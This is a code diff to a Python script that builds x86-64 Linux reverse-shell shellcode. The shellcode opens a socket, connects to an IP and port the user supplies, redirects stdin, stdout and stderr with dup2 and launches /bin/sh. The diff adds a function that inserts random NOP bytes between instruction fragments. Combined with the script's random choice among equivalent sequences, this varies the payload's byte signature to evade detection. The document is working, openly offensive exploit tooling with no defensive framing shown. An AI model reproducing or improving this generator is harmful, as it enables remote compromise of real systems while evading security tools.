@@ -2,6 +2,12 @@ import argparse
 import operator
 from random import randint
 
+def nopornot():
+    if randint(0, 4) == 1:
+        return "\\x90"
+    else:
+        return ""
+
 def clean(register):
     if register == "rax":
         values = ["\\x48\\x31\\xC0", "\\xC4\\xE2\\xF8\\xF2\\xC0", "\\x48\\x29\\xC0"]
@@ -20,18 +26,18 @@ def clean(register):
 
 def socket():
     values = [
-        "\\xB0\\x29\\x6A\\x02\\x5F\\x6A\\x01\\x5E"+clean("rdx")+"\\x0F\\x05\\x49\\x89\\xC1",
+        "\\xB0\\x29\\x6A\\x02\\x5F\\x6A\\x01\\x5E"+clean("rdx")+nopornot()+"\\x0F\\x05\\x49\\x89\\xC1",
         "\\xB0\\x29\\xB3\\x02\\x48\\x89\\xDF\\xB3\\x01\\x48\\x89\\xDE\\x0F\\x05\\x49\\x89\\xC1"]
 
     return values[randint(0, len(values)-1)]
 
 def connect(ip, port):
-    values = ["\\x48\\x97"+clean("rcx")+"\\xBB"+ip+"\\x83\\xF3\\xFF\\x51\\x51\\x53\\x66\\x68"+port+"\\x66\\x6A\\x02\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x48\\x89\\xFB\\xB0\\x2A\\x0F\\x05"]
+    values = ["\\x48\\x97"+clean("rcx")+nopornot()+"\\xBB"+ip+nopornot()+"\\x83\\xF3\\xFF\\x51\\x51\\x53\\x66\\x68"+port+nopornot()+"\\x66\\x6A\\x02\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x48\\x89\\xFB\\xB0\\x2A\\x0F\\x05"]
     return values[randint(0, len(values)-1)]
 
 def dup2():
     values = [
-       clean("rax")+clean("rdx")+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\x31\\xF6\\x0F\\x05"+clean("rax")+clean("rdx")+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\xFF\\xC6\\x0F\\x05"+clean("rax")+clean("rdx")+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\xFF\\xC6\\x0F\\x05",
+       clean("rax")+clean("rdx")+nopornot()+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\x31\\xF6\\x0F\\x05"+clean("rax")+nopornot()+clean("rdx")+nopornot()+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\xFF\\xC6\\x0F\\x05"+clean("rax")+nopornot()+clean("rdx")+nopornot()+"\\xB0\\x21\\x4C\\x89\\xCF\\x48\\xFF\\xC6\\x0F\\x05",
         "\\x6A\\x02\\x5E\\x4C\\x89\\xCF\\x6A\\x21\\x58\\x0F\\x05\\x48\\xFF\\xCE\\x79\\xF6"]
 
     return values[randint(0, len(values)-1)]
@@ -39,7 +45,7 @@ def dup2():
 def shell():
     values = [
         "\\x48\\x31\\xD2\\x52\\x52\\x48\\xBB\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x53\\x48\\x89\\xE7\\x52\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05",
-        clean("rax")+clean("rbx")+"\\x48\\xBB\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x50\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05"]
+        clean("rax")+nopornot()+clean("rbx")+nopornot()+"\\x48\\xBB\\x2F\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x50\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\xB0\\x3B\\x0F\\x05"]
 
     return values[randint(0, len(values)-1)]
 
@@ -51,15 +57,25 @@ def clean_exit():
 def constructor(ip, port):
     shellcode = ""
     shellcode += clean("rax")
+    shellcode += nopornot()
     shellcode += clean("rbx")
+    shellcode += nopornot()
     shellcode += clean("rcx")
+    shellcode += nopornot()
     shellcode += clean("rdx")
+    shellcode += nopornot()
     shellcode += clean("rdi")
+    shellcode += nopornot()
     shellcode += clean("rsi")
+    shellcode += nopornot()
     shellcode += socket()
+    shellcode += nopornot()
     shellcode += connect(ip, port)
+    shellcode += nopornot()
     shellcode += dup2()
+    shellcode += nopornot()
     shellcode += shell()
+    shellcode += nopornot()
     shellcode += clean_exit()
 
     print("Hello your shellcode is "+str(len(shellcode)/4)+" character long !")
